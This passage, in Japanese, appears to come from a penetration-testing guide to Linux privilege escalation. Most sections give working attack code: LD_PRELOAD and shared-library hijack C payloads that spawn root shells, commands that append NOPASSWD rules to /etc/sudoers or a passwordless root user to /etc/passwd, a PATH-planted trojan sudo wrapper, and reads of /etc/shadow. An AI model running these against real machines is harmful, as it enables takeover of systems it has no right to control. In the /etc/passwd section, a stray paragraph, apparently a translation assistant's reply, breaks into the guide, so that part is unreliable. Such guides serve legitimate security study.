ユーザーやグループが指定されていないポリシーは全てに適用され、一方で "default" コンテキストのポリシーは他の特定のポリシーでカバーされていないすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここで D-Bus 通信の列挙と exploit の方法を学べます:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを列挙してマシンの位置を特定するのは常に有益です。

### 一般的な列挙
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

アクセスする前に操作できなかったマシン上で実行されている network services を必ず確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff traffic ができるか確認してください。できれば、いくつかの credentials を取得できるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### Generic Enumeration

自分が**who**であるか、どの**privileges**を持っているか、システム内にどの**users**がいるか、どのアカウントが**login**できるか、そしてどのアカウントが**root privileges**を持っているかを確認してください:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大きな UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザーが権限を昇格できるバグの影響を受けていました。詳細: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
悪用するには: **`systemd-run -t /bin/bash`**

### グループ

root 権限を与える可能性のある**グループのメンバーかどうか**を確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### クリップボード

可能であればクリップボード内に興味深いものがないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境の**パスワードを知っている**場合は、そのパスワードを使って**各ユーザーにログインを試みてください**。

### Su Brute

大量のノイズを出しても構わない場合、かつコンピュータに `su` と `timeout` バイナリが存在するなら、[su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザーのブルートフォースも試みます。

## Writable PATH の悪用

### $PATH

もし **$PATH のいずれかのフォルダに書き込み可能**であれば、**書き込み可能なフォルダ内に backdoor を作成する**ことで権限を昇格できる可能性があります。作成する backdoor は別のユーザー（理想的には root）が実行するコマンド名と同じにし、かつそのコマンドが $PATH 内であなたの書き込み可能フォルダより前にあるフォルダから読み込まれないことが条件です。

### SUDO and SUID

sudo を使ってコマンドを実行できる場合や、バイナリが suid ビットを持っている場合があります。以下で確認してください:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一部の**予期しないコマンドは、ファイルの読み取りや書き込み、さらにはコマンドの実行を可能にします。** 例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo の設定によっては、ユーザーがパスワードを知らなくても別のユーザーの権限でコマンドを実行できることがある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例ではユーザー `demo` が `root` として `vim` を実行できます。root directory に ssh key を追加するか `sh` を呼び出すことで、簡単にシェルを取得できます。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、何かを実行する際に**環境変数を設定する**ことを許可します:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTB machine Admirerに基づく**もので、スクリプトを root 権限で実行する際に任意の python ライブラリを読み込ませるための **PYTHONPATH hijacking** に**脆弱**でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV が sudo env_keep を通じて保持されると → root shell

もし sudoers が `BASH_ENV` を保持している場合（例: `Defaults env_keep+="ENV BASH_ENV"`）、Bash の非対話的な起動動作を悪用して、許可されたコマンドを実行する際に任意のコードを root として実行できます。

- なぜ動作するか: 非対話シェルでは、Bash は `$BASH_ENV` を評価し、ターゲットスクリプトを実行する前にそのファイルを読み込みます。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可します。`BASH_ENV` が sudo によって保持されている場合、あなたのファイルは root 権限で読み込まれます。

- 要件:
- 実行できる sudo ルール（`/bin/bash` を非対話的に呼び出すターゲット、または任意の bash スクリプト）。
- `BASH_ENV` が `env_keep` に存在すること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- ハードニング:
- `BASH_ENV`（および `ENV`）を `env_keep` から削除し、`env_reset` を推奨。
- sudoで許可されたコマンドに対するシェルラッパーは避け、最小限のバイナリを使用する。
- 保存された環境変数が使用される場合、sudoのI/Oログおよびアラートを検討する。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), any relative command inside the sudo-allowed target can be shadowed.

- 要件: スクリプト/バイナリを実行する sudo ルール（多くは `NOPASSWD`）があり、そのスクリプト/バイナリが絶対パスを使わずにコマンド（`free`, `df`, `ps` など）を呼び出し、かつ最初に検索される書き込み可能な PATH エントリがあること。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 実行でのパスのバイパス
**Jump**して他のファイルを読んだり、**symlinks**を使ったりする。例えば sudoers ファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし**wildcard**が使われている（\*）なら、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID バイナリでコマンドのパスが指定されていない場合

もし **sudo permission** が単一のコマンドに対して **パスを指定せずに** 与えられている（例: _hacker10 ALL= (root) less_）場合、PATH 変数を変更してそれを悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この手法は、**suid** binary **別のコマンドを実行する際にパスを指定していない場合（常に _**strings**_ で怪しい SUID binary の内容を確認してください）**。

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary がコマンドのパスを指定している場合

もし **suid** binary **パスを指定して別のコマンドを実行している** 場合、suid ファイルが呼び出すコマンド名と同じ名前の **export a function** を作成して試すことができます。

例えば、もし suid binary が _**/usr/sbin/service apache2 start**_ を呼び出している場合、そのコマンド名と同名の関数を作成してエクスポートしてみてください：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### LD_PRELOAD & **LD_LIBRARY_PATH**

環境変数 **LD_PRELOAD** は、標準Cライブラリ (`libc.so`) を含む他のすべてのライブラリより先に、ローダによって読み込まれる1つ以上の共有ライブラリ（.so ファイル）を指定するために使われます。この処理はライブラリのプリロードと呼ばれます。

しかし、この機能が悪用されるのを防ぎシステムのセキュリティを保つため、特に **suid/sgid** 実行ファイルに対して、システムは以下の条件を課します:

- 実行ファイルの real user ID（_ruid_）が effective user ID（_euid_）と一致しない場合、ローダは **LD_PRELOAD** を無視します。
- suid/sgid を持つ実行ファイルに対しては、標準パスにありかつ同様に suid/sgid を持つライブラリのみがプリロードされます。

もし `sudo` でコマンドを実行する権限があり、かつ `sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合、権限昇格が発生する可能性があります。この設定により、`sudo` でコマンドを実行しても **LD_PRELOAD** 環境変数が保持され認識されるため、任意のコードが昇格した権限で実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** として保存
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、**compile it** を使用して:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行します
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 似たような privesc は、攻撃者が **LD_LIBRARY_PATH** 環境変数を制御している場合にも悪用され得ます。攻撃者はライブラリが検索されるパスを制御するためです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

通常と異なるように見える**SUID**権限を持つバイナリに遭遇した場合、そのバイナリが**.so**ファイルを正しく読み込んでいるか確認することは良い習慣です。これは次のコマンドを実行して確認できます:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇した場合、悪用の可能性が示唆されます。

これを悪用するには、_"/path/to/.config/libcalc.c"_ というCファイルを作成し、以下のコードを記述します：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイルのパーミッションを操作して特権を昇格させ、昇格した権限でシェルを実行することを目的としています。

上記の C ファイルを共有オブジェクト (.so) ファイルにコンパイルするには：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受ける SUID バイナリを実行すると exploit がトリガーされ、system compromise の可能性が生じます。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
SUID binary が書き込み可能なフォルダから library をロードしていることが分かったので、そのフォルダに必要な名前で library を作成しましょう:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
つまり、生成したライブラリには `a_function_name` という名前の関数が必要です。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、ローカルのセキュリティ制限を回避するために攻撃者が悪用できる Unix バイナリの厳選リストです。[**GTFOArgs**](https://gtfoargs.github.io/) は同様のプロジェクトで、コマンドに**引数だけを注入できる**場合についてまとめています。

このプロジェクトは、制限されたシェルから抜け出す、特権を昇格または維持する、ファイルを転送する、bind and reverse shells を生成する、その他の post-exploitation タスクを容易にするために悪用できる Unix バイナリの正規の機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### sudo トークンの再利用

パスワードを知らないが **sudo access** を持っているケースでは、**sudo コマンドの実行を待ってセッション・トークンをハイジャックする**ことで特権を昇格できます。

特権昇格の要件:

- すでにユーザ _sampleuser_ としてシェルを持っている
- _sampleuser_ は **`sudo` を使用して** 何かを実行してから **過去15分以内** であること（デフォルトではこれは sudo トークンの有効期間で、パスワードを入力せずに `sudo` を使える時間です）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 である
- `gdb` が利用可能であること（アップロードできること）

（一時的に `ptrace_scope` を有効にするには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を実行するか、`/etc/sysctl.d/10-ptrace.conf` を恒久的に変更して `kernel.yama.ptrace_scope = 0` を設定します）

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- The **second exploit** (`exploit_v2.sh`) は _/tmp_ に sh shell を作成し、**root 所有で setuid** になります
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **3番目の exploit** (`exploit_v3.sh`) は **sudoers file を作成し**、**sudo tokens を永続化し、すべてのユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダ内、またはそのフォルダ内で作成されたファイルのいずれかに対して**書き込み権限**がある場合、バイナリ[**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)を使用して**ユーザーとPIDのための sudo トークンを作成**できます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、かつそのユーザーとして PID 1234 のシェルを持っている場合、パスワードを知らなくても次のようにして**sudo 権限を取得**できます:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使えるかとその方法を設定します。これらのファイルは**デフォルトでは user root と group root のみが読み取れます**。\
**If** このファイルを**read**できれば、**obtain some interesting information** を得られる可能性があります。さらに任意のファイルに**write**できれば、**escalate privileges** できます。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込み可能なら、その権限を悪用できる
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` binary の代替として、OpenBSD 向けの `doas` などがあります。設定は `/etc/doas.conf` を確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

ユーザーが通常マシンに接続して権限昇格に `sudo` を使用することが分かっており、そのユーザーコンテキストでシェルを取得している場合、root として自分のコードを実行し、その後ユーザーのコマンドを実行するような新しい **sudo executable** を作成できます。次に、ユーザーコンテキストの **$PATH を変更**（例: 新しいパスを `.bash_profile` に追加）して、ユーザーが `sudo` を実行したときにあなたの sudo executable が実行されるようにします。

注意: ユーザーが別のシェル（bash 以外）を使用している場合、新しいパスを追加するために他のファイルを変更する必要があります。例えば [sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を変更します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります。

あるいは次のように実行することもできます:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は、**読み込まれる設定ファイルの場所**を示します。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり `/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれます。これらの設定ファイルは**別のフォルダを指しており**、その中で**ライブラリが検索されます**。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**システムは `/usr/local/lib` 内でライブラリを検索する**ということです。

もし何らかの理由で **ユーザーに書き込み権限がある** 場合（例: `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` に指定された設定ファイル内の任意のフォルダ）、権限昇格が可能になることがあります.\
以下のページで**この誤設定をどのように悪用するか**を確認してください:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定されているとおり、プログラムはこの場所の lib を使用します。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`/var/tmp` に evil library を `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` で作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities はプロセスに対して利用可能な root 権限の**サブセットを提供します**。これは実質的に root の**権限をより小さく識別可能な単位に分割する**ことを意味します。これらの各単位は個別にプロセスに付与できるため、権限の全体セットが縮小され、悪用のリスクが低減します。\
以下のページを読んで、capabilities とその悪用方法について**さらに学んでください**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**bit for "execute"** は対象ユーザーが "**cd**" できることを意味します。\
**"read"** bit はユーザーが **list** the **files** できることを意味し、**"write"** bit はユーザーが **delete** および **create** new **files** できることを意味します。

## ACLs

Access Control Lists (ACLs) は任意の権限に対する二次的なレイヤーを表し、従来の ugo/rwx 権限を**上書きできる**可能性があります。これらの権限は、オーナーでもグループの一員でもない特定のユーザーに対してアクセスを許可または拒否することで、ファイルやディレクトリへのアクセス制御を強化します。このレベルの**粒度により、より正確なアクセス管理が可能になります**。詳細は [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) を参照してください。

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得する** システムから特定の ACLs を持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 開いている shell セッション

**古いバージョン**では、別のユーザー（**root**）の**shell**セッションを**hijack**できる場合があります。\
**最新のバージョン**では、**connect**できるのは**自分のユーザー**の screen セッションに限られます。ただし、セッション内に**興味深い情報**が見つかることがあります。

### screen sessions hijacking

**screen セッションを一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチ**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは**古い tmux バージョン**の問題でした。

非特権ユーザーとして、root によって作成された tmux (v2.1) セッションをハイジャックできませんでした。

**tmux セッションの一覧を表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションに接続する**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
例として **Valentine box from HTB** を参照してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

September 2006 から 2008年5月13日の間に Debian 系システム（Ubuntu, Kubuntu, etc）で生成されたすべての SSL および SSH キーはこのバグの影響を受ける可能性があります。\
このバグはこれらの OS で新しい ssh キーを作成したときに発生し、**わずか 32,768 通りしか生成されなかった**ためです。つまり全ての可能性を計算でき、**ssh の公開鍵を持っていれば対応する秘密鍵を検索できます**。計算済みの候補はここで見つけられます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証が許可されているかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合に、空のパスワード文字列を持つアカウントでのログインをサーバが許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

root が ssh を使ってログインできるかどうかを指定します。デフォルトは `no` です。可能な値:

- `yes`: root はパスワードと秘密鍵でログインできます
- `without-password` or `prohibit-password`: root は秘密鍵でのみログインできます
- `forced-commands-only`: root は秘密鍵でのみ、かつコマンドオプションが指定されている場合にのみログインできます
- `no` : ログイン不可

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。`%h` のようなトークンを含めることができ、ユーザーのホームディレクトリに置き換えられます。**絶対パスを指定できます**（`/` で始まる）または**ユーザーのホームからの相対パス**を指定できます。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー "**testusername**" の **private** キーでログインしようとした場合、ssh があなたのキーの公開鍵を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding により、サーバー上に（パスフレーズなしで！）鍵を置いておく代わりに、**ローカルの SSH keys を使用**できます。これにより、ssh 経由でホストに接続し、そこから初期ホストにある **key** を使って別のホストへさらに接続（ジャンプ）することができます。

このオプションは `$HOME/.ssh.config` に次のように設定する必要があります:
```
Host example.com
ForwardAgent yes
```
注意: `Host` が `*` の場合、ユーザーが別のマシンに移動するたびに、そのホストが鍵にアクセスできるようになり（これはセキュリティ上の問題です）。

ファイル `/etc/ssh_config` はこの設定を**上書き**でき、この構成を許可または拒否できます。\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` によって ssh-agent forwarding を**許可**または**拒否**できます（デフォルトは許可）。

環境で Forward Agent が設定されていることが分かった場合、次のページを参照してください。**悪用して特権昇格できる可能性がある**ため:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

ファイル `/etc/profile` と `/etc/profile.d/` 以下のファイルは、**ユーザーが新しいシェルを起動したときに実行されるスクリプトです**。したがって、これらのいずれかに**書き込みまたは変更ができる場合、特権昇格が可能になります**。
```bash
ls -l /etc/profile /etc/profile.d/
```
もし奇妙な profile script が見つかった場合は、**機密情報**が含まれていないか確認してください。

### Passwd/Shadow ファイル

OS によっては `/etc/passwd` と `/etc/shadow` のファイル名が異なっていたり、バックアップが存在することがあります。したがって、**それらをすべて見つけ出し**、**読み取れるか確認して**、ファイル内に **hashes** が含まれているかどうかを確認することを推奨します:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等のファイル）内で**password hashes**を見つけることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、次のいずれかのコマンドで password を生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
翻訳する元の README.md の内容を貼ってください。貼っていただければ、英語の本文を日本語に翻訳して markdown やタグはそのままにします。ご要望の「ユーザー `hacker` を追加し、生成されたパスワードを追記」も反映します。実際のシステム上でユーザーを作成することはできないため、必要であればそのためのコマンドと生成パスワードを出力します。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドを使って `hacker:hacker` を使用できます。

あるいは、以下の行を使ってパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSDプラットフォームでは `/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

**機密性の高いファイルに書き込みができるか**を確認してください。例えば、いくつかの**サービスの設定ファイル**に書き込めますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが**tomcat**サーバを実行しており、かつ**/etc/systemd/内のTomcatサービス設定ファイルを変更できる**場合、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
あなたの backdoor は、tomcat が次に起動されるときに実行されます。

### フォルダを確認

次のフォルダにはバックアップや有用な情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** （おそらく最後のものは読めないでしょうが、試してみてください）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned ファイル
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
